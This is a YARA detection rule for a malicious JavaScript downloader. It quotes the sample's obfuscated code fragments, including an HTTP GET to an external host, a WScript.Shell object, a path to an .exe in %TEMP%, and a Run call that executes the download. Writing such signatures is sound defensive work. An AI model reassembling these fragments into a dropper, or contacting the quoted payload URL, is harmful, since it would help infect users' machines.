rule sig_20160329_4b1357a153df8322410f2292b5045728 {
  meta:
    description = "datamaliciousorder - file 20160329_4b1357a153df8322410f2292b5045728.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a769a80f4f4afe9ba9a99de5d009fd74c470bf3224e43030573ab62536fce7ad"

  strings:
    $s1  = "function Zlspeazy() {return Hzwck[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4hl8iPnn0wed7hhr.exe\";};" fullword ascii
    $s2  = "Cudafyg[Lebhx](\"GET\", \"http://darjewellery.com/kwo9pa\", false);" fullword ascii
    $s3  = "do {WScript[Ukati](Nbidojp() * 11)} while (Cudafyg[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Iewkvjzmt(Wrjsvmp, Dnfpallu){return Wrjsvmp - Dnfpallu;};" fullword ascii
    $s5  = "var Hzwck = function Naowrfz() {return WScript[Rkohyjros](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nrbcpub(Tkkjpe){Hzwck[\"Run\"](Tkkjpe, Tmhci, Tmhci);};" fullword ascii
    $s7  = "function Tpdnc() {return ((Cppuxsgcn == true) && (Cppuxsgcn == Puqmaolss)) ? 1 : Tmhci;};" fullword ascii
    $s8  = "var Puqmaolss = false;" fullword ascii
    $s9  = "function Jnvxbtbbg(){return Rkohyjros;};" fullword ascii
    $s10 = " while (Rvvahmkktc){" fullword ascii
    $s11 = "function Nbidojp(){return 22;};" fullword ascii
    $s12 = "function Aatoknejqo(){return Ghrwfxf;};" fullword ascii
    $s13 = "Cppuxsgcn = true; " fullword ascii
    $s14 = "function Opjlt()" fullword ascii
    $s15 = "Puqmaolss = true; " fullword ascii
    $s16 = "var Cppuxsgcn = false;" fullword ascii
    $s17 = "var Ouywibhbfe = false;" fullword ascii
    $s18 = "function Asfkqy(Vwwwrdyhqd) {var Mrfku = (1, 2, 3, 4, 5, Vwwwrdyhqd); return Mrfku;};" fullword ascii
    $s19 = "var Rdfqv = new this[\"Date\"]();" fullword ascii
    $s20 = "return Iewkvjzmt(Etfdrcfl, Ahtbuky);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}